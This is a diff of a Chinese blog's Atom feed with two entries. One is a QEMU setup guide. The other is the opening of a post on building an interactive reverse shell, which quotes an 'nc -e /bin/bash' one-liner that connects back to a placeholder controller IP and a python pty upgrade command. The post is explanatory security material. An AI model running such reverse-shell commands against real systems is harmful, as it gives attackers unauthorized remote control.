@@ -1,19 +1,23 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom" xml:lang="zh_CN">
-	<title>二进制咸鱼的自我救赎 - linux</title>
-	<subtitle>幸福往往是摸的透彻，而敬业的心却常常隐藏。</subtitle>
-	<link href="https://chenx6.github.io/tags/linux/atom.xml" rel="self" type="application/atom+xml"/>
-  <link href="https://chenx6.github.io/"/>
-	<generator uri="https://www.getzola.org/">Zola</generator>
-	<updated>2023-02-19T00:00:00+00:00</updated>
-	<id>https://chenx6.github.io/tags/linux/atom.xml</id>
-	<entry xml:lang="zh_CN">
-		<title>QEMU 简易配置（CPU&#x2F;内存&#x2F;网络&#x2F;...）</title>
-		<published>2023-02-19T00:00:00+00:00</published>
-		<updated>2023-02-19T00:00:00+00:00</updated>
-		<link rel="alternate" href="https://chenx6.github.io/post/qemu/" type="text/html"/>
-		<id>https://chenx6.github.io/post/qemu/</id>
-		<content type="html">&lt;p&gt;从大学开始，我看过了一堆的 QEMU 配置的文章，这些文章要不就是从别的地方复制黏贴出来的，要不就是使用了已经停止维护的工具。所以我决定从网上找一手资料（QEMU Wiki，文档, man qemu，...）来写一篇文章来讲讲怎么简单的配置 QEMU 模拟虚拟机。在文章的最后放了最终运行的命令，大家复制了保存成脚本就可以使用，或者根据自己的要求来配置。（这个脚本已经经过 2 个人使用了，很好用 233）&lt;&#x2F;p&gt;
+    <title>二进制咸鱼的自我救赎 - linux</title>
+    <subtitle>幸福往往是摸的透彻，而敬业的心却常常隐藏。</subtitle>
+    <link href="https://chenx6.github.io/tags/linux/atom.xml" rel="self" type="application/atom+xml"/>
+    <link href="https://chenx6.github.io/"/>
+    <generator uri="https://www.getzola.org/">Zola</generator>
+    <updated>2023-02-19T00:00:00+00:00</updated>
+    <id>https://chenx6.github.io/tags/linux/atom.xml</id>
+    <entry xml:lang="zh_CN">
+        <title>QEMU 简易配置（CPU&#x2F;内存&#x2F;网络&#x2F;...）</title>
+        <published>2023-02-19T00:00:00+00:00</published>
+        <updated>2023-02-19T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://chenx6.github.io/post/qemu/" type="text/html"/>
+        <id>https://chenx6.github.io/post/qemu/</id>
+        
+        <content type="html">&lt;p&gt;从大学开始，我看过了一堆的 QEMU 配置的文章，这些文章要不就是从别的地方复制黏贴出来的，要不就是使用了已经停止维护的工具。所以我决定从网上找一手资料（QEMU Wiki，文档, man qemu，...）来写一篇文章来讲讲怎么简单的配置 QEMU 模拟虚拟机。在文章的最后放了最终运行的命令，大家复制了保存成脚本就可以使用，或者根据自己的要求来配置。（这个脚本已经经过 2 个人使用了，很好用 233）&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;CPU_配置&quot;&gt;CPU 配置&lt;&#x2F;h2&gt;
 &lt;p&gt;下面的选项开启 KVM 全虚拟化支持，能提升虚拟机的速度。&lt;&#x2F;p&gt;
 &lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash z-code&quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;z-source z-shell z-bash&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-shell&quot;&gt;&lt;span class=&quot;z-variable z-function z-shell&quot;&gt;--enable-kvm&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
@@ -88,14 +92,19 @@ dhcp-range=192.168.122.2,192.168.122.200
 &lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;wiki.qemu.org&#x2F;Documentation&#x2F;Networking&quot;&gt;https:&#x2F;&#x2F;wiki.qemu.org&#x2F;Documentation&#x2F;Networking&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
 &lt;&#x2F;ul&gt;
 </content>
-	</entry>
-	<entry xml:lang="zh_CN">
-		<title>写一个可交互的反弹 Shell</title>
-		<published>2022-05-02T19:19:57+08:00</published>
-		<updated>2022-05-02T19:19:57+08:00</updated>
-		<link rel="alternate" href="https://chenx6.github.io/post/rev_pty/" type="text/html"/>
-		<id>https://chenx6.github.io/post/rev_pty/</id>
-		<content type="html">&lt;p&gt;在网上能看到一堆的反弹 Shell 方法，最常见的就是先用 &lt;code&gt;nc -e &#x2F;bin&#x2F;bash $控制机IP $控制机端口&lt;&#x2F;code&gt; 弹出一个 Shell，然后再用 &lt;code&gt;python3 -c &#x27;import pty; pty.spawn(&amp;quot;&#x2F;bin&#x2F;bash&amp;quot;)&#x27;&lt;&#x2F;code&gt; 这样来升级成交互式 Shell。这样的话得保证环境里有 nc + python，或者得在被控机上下载多个文件。这样的话，还不如直接自己写一个 Shell 呢 233。&lt;&#x2F;p&gt;
+        
+    </entry>
+    <entry xml:lang="zh_CN">
+        <title>写一个可交互的反弹 Shell</title>
+        <published>2022-05-02T19:19:57+08:00</published>
+        <updated>2022-05-02T19:19:57+08:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://chenx6.github.io/post/rev_pty/" type="text/html"/>
+        <id>https://chenx6.github.io/post/rev_pty/</id>
+        
+        <content type="html">&lt;p&gt;在网上能看到一堆的反弹 Shell 方法，最常见的就是先用 &lt;code&gt;nc -e &#x2F;bin&#x2F;bash $控制机IP $控制机端口&lt;&#x2F;code&gt; 弹出一个 Shell，然后再用 &lt;code&gt;python3 -c &#x27;import pty; pty.spawn(&amp;quot;&#x2F;bin&#x2F;bash&amp;quot;)&#x27;&lt;&#x2F;code&gt; 这样来升级成交互式 Shell。这样的话得保证环境里有 nc + python，或者得在被控机上下载多个文件。这样的话，还不如直接自己写一个 Shell 呢 233。&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;“可交互_Shell”_的原理&quot;&gt;“可交互 Shell” 的原理&lt;&#x2F;h2&gt;
 &lt;p&gt;现在常见的“终端模拟器”，例如 KDE 的 Konsole, MACos 上的 iterm，服务器上的 SSH，都是使用 &amp;quot;pty&amp;quot; 来实现的。而我们反弹的 Shell 则不一样，所以无法交互。&lt;&#x2F;p&gt;
 &lt;p&gt;而 pty 则是模拟终端的设备。平时使用的终端模拟器是和 pty master 进行沟通，而里面的 shell 是和 pty slave 进行沟通，两者通过 pty 进行沟通。&lt;&#x2F;p&gt;
@@ -235,5 +244,6 @@ determine the terminal attributes and window size of the slave side of the pseud
 &lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;zhuanlan.zhihu.com&#x2F;p&#x2F;57518857&quot;&gt;linux select函数解析以及事例&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
 &lt;&#x2F;ul&gt;
 </content>
-	</entry>
+        
+    </entry>
 </feed>
